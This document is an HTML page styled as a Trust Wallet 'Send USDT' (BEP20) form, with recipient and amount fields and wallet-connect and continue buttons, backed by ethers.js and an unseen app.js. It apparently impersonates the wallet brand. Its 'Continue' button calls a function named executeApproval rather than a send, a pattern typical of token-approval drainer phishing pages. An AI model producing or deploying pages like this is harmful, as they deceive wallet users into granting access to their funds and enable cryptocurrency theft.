<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trust Wallet - Send USDT</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f6f8f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .wallet-card {
      width: 100%;
      max-width: 375px;
      background: #ffffff;
      border-radius: 24px;
      padding: 24px;
      box-shadow: 0 8px 24px rgba(149, 157, 165, 0.1);
    }
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 24px;
    }
    .header h2 {
      font-size: 18px;
      font-weight: 600;
      margin: 0;
      color: #1e2329;
    }
    .token-info {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      padding: 12px;
      border-radius: 16px;
      margin-bottom: 20px;
    }
    .token-logo {
      width: 36px;
      height: 36px;
      background: #26a17b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: bold;
      margin-right: 12px;
    }
    .label {
      font-size: 14px;
      color: #707a8a;
      margin-bottom: 8px;
    }
    .input-group {
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 16px;
      border: 1px solid #eaecef;
      border-radius: 12px;
      font-size: 16px;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.2s;
    }
    input:focus {
      border-color: #0052ff;
    }
    .action-btn {
      width: 100%;
      padding: 16px;
      border-radius: 24px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.2s;
      margin-top: 10px;
    }
    .btn-primary {
      background-color: #0052ff;
      color: white;
    }
    .btn-secondary {
      background-color: #e7eaf3;
      color: #0052ff;
    }
    .action-btn:active {
      opacity: 0.8;
    }
    #status {
      text-align: center;
      font-size: 14px;
      color: #707a8a;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<div class="wallet-card">
  <div class="header">
    <h2>Send USDT</h2>
    <span style="color: #0052ff; font-weight: 500; font-size: 14px;">BEP20</span>
  </div>

  <div class="token-info">
    <div class="token-logo">T</div>
    <div>
      <div style="font-weight: 600; color: #1e2329;">Tether</div>
      <div style="font-size: 12px; color: #707a8a;">USDT</div>
    </div>
  </div>

  <div class="input-group">
    <div class="label">Recipient Address</div>
    <input id="to" type="text" placeholder="0x..." spellcheck="false">
  </div>

  <div class="input-group">
    <div class="label">Amount</div>
    <input id="amount" type="number" placeholder="0.00" step="any">
  </div>

  <button class="action-btn btn-secondary" onclick="connectWallet()">Connect Wallet</button>
  <button class="action-btn btn-primary" onclick="executeApproval()">Continue</button>
  
  <p id="status">Ready to connect</p>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
<script src="app.js"></script>
</body>
</html>
